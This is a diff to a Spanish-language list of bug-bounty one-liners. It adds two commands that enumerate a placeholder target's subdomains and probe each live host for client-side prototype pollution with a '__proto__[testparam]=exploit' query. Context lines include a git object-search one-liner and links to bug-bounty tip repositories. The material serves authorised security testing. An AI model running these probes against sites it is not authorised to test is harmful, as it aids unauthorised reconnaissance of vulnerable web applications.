@@ -21,6 +21,18 @@ Oneliner para buscar patrones en todos los objetos de un repositorio GIT (by @to
 { find .git/objects/pack/ -name "*.idx"|while read i;do git show-index < "$i"|awk '{print $2}';done;find .git/objects/ -type f|grep -v '/pack/'|awk -F'/' '{print $(NF-1)$NF}'; }|while read o;do git cat-file -p $o;done|grep -E '<pattern>'  
 ```
 
+Dos onliners para chequear Prototype Pollution  
+Herramientas usadas:  
+https://github.com/detectify/page-fetch  
+https://github.com/BlackFan/client-side-prototype-pollution  
+```
+subfinder -d http://target.com -all -silent | httpx -silent | anew alive.txt
+
+sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN" 
+```
+
+
+
 https://github.com/KingOfBugbounty/KingOfBugBountyTips  
 
 https://github.com/twseptian/oneliner-bugbounty  
